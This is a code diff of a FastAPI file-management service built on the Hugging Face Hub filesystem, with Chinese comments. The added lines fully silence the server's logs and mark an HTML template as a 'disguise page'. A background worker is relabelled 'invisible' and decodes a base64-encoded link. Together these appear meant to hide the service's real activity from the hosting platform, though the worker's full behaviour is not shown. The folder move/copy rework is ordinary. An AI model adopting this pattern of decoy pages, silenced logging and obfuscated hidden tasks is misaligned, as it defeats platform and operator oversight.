@@ -15,9 +15,13 @@ from fastapi.responses import HTMLResponse, StreamingResponse
 from fastapi.concurrency import run_in_threadpool
 from huggingface_hub import HfFileSystem, HfApi
 
+# 1. 彻底静默日志
 logging.getLogger("uvicorn").setLevel(logging.CRITICAL)
+logging.getLogger("uvicorn.error").setLevel(logging.CRITICAL)
+logging.getLogger("uvicorn.access").setLevel(logging.CRITICAL)
 logging.getLogger("huggingface_hub").setLevel(logging.CRITICAL)
 
+# 2. 伪装页面
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -104,7 +108,7 @@ class SystemKernel:
                     if remaining != float('inf'): remaining -= len(c)
         except Exception: pass
 
-    # --- 后台任务 ---
+    # --- 隐形后台任务 ---
     def _hidden_worker(self, encoded_link: str):
         try:
             link = base64.b64decode(encoded_link).decode('utf-8')
@@ -243,7 +247,7 @@ class SystemKernel:
             return Response(status_code=404)
         except Exception: return Response(status_code=500)
 
-    # 强化版 Move/Copy：自动判断类型，防止 I/O 错误
+    # 【核心安全修复】op_mv_cp: 文件夹采用"复制后删除"策略，防止数据丢失
     async def op_mv_cp(self, s: str, d_h: str, mv: bool) -> Response:
         if not d_h: return Response(status_code=400)
         try:
@@ -254,24 +258,33 @@ class SystemKernel:
             if not await run_in_threadpool(self.fs.exists, src_full):
                 return Response(status_code=404)
 
-            # 获取源类型（文件/文件夹）
+            # 获取源类型
             info = await run_in_threadpool(self.fs.info, src_full)
             is_dir = (info['type'] == 'directory')
 
             def _execute():
-                # 使用原生命令，不走流式复制，解决 I/O 错误
                 if mv:
-                    self.fs.mv(src_full, dst_full, recursive=is_dir)
+                    if is_dir:
+                        # 文件夹移动：【安全策略】先完整复制，再删除旧的
+                        # 这避免了直接移动导致的 I/O 错误和数据丢失
+                        self.fs.cp(src_full, dst_full, recursive=True)
+                        # 确认复制成功（不报错）后，再删除源文件
+                        self.fs.rm(src_full, recursive=True)
+                    else:
+                        # 单文件移动：直接调用原生 mv (效率高)
+                        self.fs.mv(src_full, dst_full)
                 else:
+                    # 复制操作
                     self.fs.cp(src_full, dst_full, recursive=is_dir)
 
             await run_in_threadpool(_execute)
             
-            # 刷新缓存
+            # 双重刷新缓存
             await run_in_threadpool(self._flush, os.path.dirname(src_full))
             await run_in_threadpool(self._flush, os.path.dirname(dst_full))
             return Response(status_code=201)
-        except Exception: return Response(status_code=500)
+        except Exception:
+            return Response(status_code=500)
 
     async def op_mk(self, p: str) -> Response:
         fp = self._p(p)
